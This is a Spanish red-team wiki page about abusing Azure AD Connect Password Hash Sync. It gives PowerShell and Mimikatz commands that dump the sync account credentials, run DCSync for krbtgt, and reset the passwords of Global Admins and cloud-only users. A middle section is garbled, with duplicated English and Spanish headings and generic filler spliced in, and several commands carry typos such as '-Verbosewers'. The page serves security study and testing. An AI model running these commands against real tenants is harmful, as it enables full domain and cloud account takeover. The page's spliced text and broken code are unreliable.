# Az - PHS - Password Hash Sync

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informaci칩n B치sica

[De la documentaci칩n:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Password hash synchronization** es uno de los m칠todos de inicio de sesi칩n utilizados para lograr una identidad h칤brida. **Azure AD Connect** sincroniza un hash, del hash, de la contrase침a de un usuario desde una instancia de Active Directory local a una instancia de Azure AD basada en la nube.

<figure><img src="../../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

Es el **m칠todo m치s com칰n** utilizado por las empresas para sincronizar un AD local con Azure AD.

Todos los **usuarios** y un **hash de los hashes de las contrase침as** se sincronizan desde el local a Azure AD. Sin embargo, las **contrase침as en texto claro** o los **hashes originales** no se env칤an a Azure AD.\
Adem치s, los **grupos de seguridad integrados** (como los administradores de dominio...) **no se sincronizan** con Azure AD.

La **sincronizaci칩n de hashes** ocurre cada **2 minutos**. Sin embargo, por defecto, la **caducidad de la contrase침a** y la **caducidad de la cuenta** **no se sincronizan** en Azure AD. Por lo tanto, un usuario cuya **contrase침a local ha caducado** (no cambiada) puede continuar **accediendo a los recursos de Azure** usando la contrase침a antigua.

Cuando un usuario local quiere acceder a un recurso de Azure, la **autenticaci칩n se realiza en Azure AD**.

**PHS** es necesario para funciones como **Identity Protection** y AAD Domain Services.

## Pivoting

Cuando PHS est치 configurado, algunas **cuentas privilegiadas** se **crean autom치ticamente**:

* La cuenta **`MSOL_<installationID>`** se crea autom치ticamente en el AD local. A esta cuenta se le asigna un rol de **Directory Synchronization Accounts** (ver [documentaci칩n](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)), lo que significa que tiene **permisos de replicaci칩n (DCSync) en el AD local**.
* Una cuenta **`Sync_<name of on-prem ADConnect Server>_installationID`** se crea en Azure AD. Esta cuenta puede **restablecer la contrase침a de CUALQUIER usuario** (sincronizado o solo en la nube) en Azure AD.

Las contrase침as de las dos cuentas privilegiadas anteriores se **almacenan en un servidor SQL** en el servidor donde **Azure AD Connect est치 instalado.** Los administradores pueden extraer las contrase침as de esos usuarios privilegiados en texto claro.\
La base de datos se encuentra en `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Es posible extraer la configuraci칩n de una de las tablas, siendo una encriptada:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

La **configuraci칩n encriptada** est치 encriptada con **DPAPI** y contiene las **contrase침as del usuario `MSOL_*`** en el AD local y la contrase침a de **Sync\_\*** en AzureAD. Por lo tanto, comprometiendo estas es posible escalar privilegios al AD y a AzureAD.

Puedes encontrar una [visi칩n general completa de c칩mo se almacenan y descifran estas credenciales en esta charla](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Encontrar el **servidor de Azure AD connect**

Si el **servidor donde est치 instalado Azure AD connect** est치 unido al dominio (recomendado en la documentaci칩n), es posible encontrarlo con:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### Abusing MSOL\_\*

### Abusando de MSOL\_\*

### Password Hash Sync (PHS)

### Sincronizaci칩n de Hash de Contrase침a (PHS)

Password Hash Sync (PHS) is a feature of Azure AD Connect that synchronizes the hash of a user's on-premises Active Directory password with Azure AD. This allows users to use the same password for both on-premises and cloud-based resources.

La Sincronizaci칩n de Hash de Contrase침a (PHS) es una caracter칤stica de Azure AD Connect que sincroniza el hash de la contrase침a de un usuario del Active Directory local con Azure AD. Esto permite a los usuarios usar la misma contrase침a tanto para recursos locales como basados en la nube.

When PHS is enabled, the password hashes are synchronized from on-premises Active Directory to Azure AD. This synchronization happens at regular intervals and ensures that the password hashes in Azure AD are up-to-date with the on-premises Active Directory.

Cuando PHS est치 habilitado, los hashes de las contrase침as se sincronizan desde el Active Directory local a Azure AD. Esta sincronizaci칩n ocurre a intervalos regulares y asegura que los hashes de las contrase침as en Azure AD est칠n actualizados con el Active Directory local.

### Extracting Password Hashes

### Extrayendo Hashes de Contrase침as

To extract password hashes from Azure AD Connect, an attacker would need to compromise the server where Azure AD Connect is installed. Once they have access to this server, they can extract the password hashes from the synchronization database.

Para extraer los hashes de las contrase침as de Azure AD Connect, un atacante necesitar칤a comprometer el servidor donde est치 instalado Azure AD Connect. Una vez que tienen acceso a este servidor, pueden extraer los hashes de las contrase침as de la base de datos de sincronizaci칩n.

### Tools and Techniques

### Herramientas y T칠cnicas

There are several tools and techniques that can be used to extract password hashes from Azure AD Connect. Some of these include:

Hay varias herramientas y t칠cnicas que se pueden usar para extraer los hashes de las contrase침as de Azure AD Connect. Algunas de estas incluyen:

- **Mimikatz**: A well-known tool that can be used to extract password hashes from memory.
- **Mimikatz**: Una herramienta bien conocida que se puede usar para extraer hashes de contrase침as de la memoria.
- **DSInternals**: A PowerShell module that can be used to extract password hashes from the synchronization database.
- **DSInternals**: Un m칩dulo de PowerShell que se puede usar para extraer hashes de contrase침as de la base de datos de sincronizaci칩n.

### Mitigations

### Mitigaciones

To mitigate the risk of password hash extraction, organizations should:

Para mitigar el riesgo de extracci칩n de hashes de contrase침as, las organizaciones deber칤an:

- Ensure that the Azure AD Connect server is secured and regularly monitored.
- Asegurarse de que el servidor de Azure AD Connect est칠 seguro y monitoreado regularmente.
- Use strong, unique passwords for all accounts.
- Usar contrase침as fuertes y 칰nicas para todas las cuentas.
- Regularly update and patch all systems.
- Actualizar y parchear regularmente todos los sistemas.
- Implement multi-factor authentication (MFA) for all users.
- Implementar autenticaci칩n multifactor (MFA) para todos los usuarios.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Tambi칠n puedes usar [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) para obtener estas credenciales.
{% endhint %}

### Abusando Sync\_\*

Comprometiendo la cuenta **`Sync_*`** es posible **restablecer la contrase침a** de cualquier usuario (incluyendo Administradores Globales)
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Tambi칠n es posible **modificar las contrase침as de solo usuarios en la nube** (incluso si eso es inesperado)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Tambi칠n es posible volcar la contrase침a de este usuario.

{% hint style="danger" %}
Otra opci칩n ser칤a **asignar permisos privilegiados a un principal de servicio**, lo cual el usuario **Sync** tiene **permisos** para hacer, y luego **acceder a ese principal de servicio** como una forma de privesc.
{% endhint %}

### Seamless SSO

Es posible usar Seamless SSO con PHS, que es vulnerable a otros abusos. Rev칤salo en:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Referencias

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
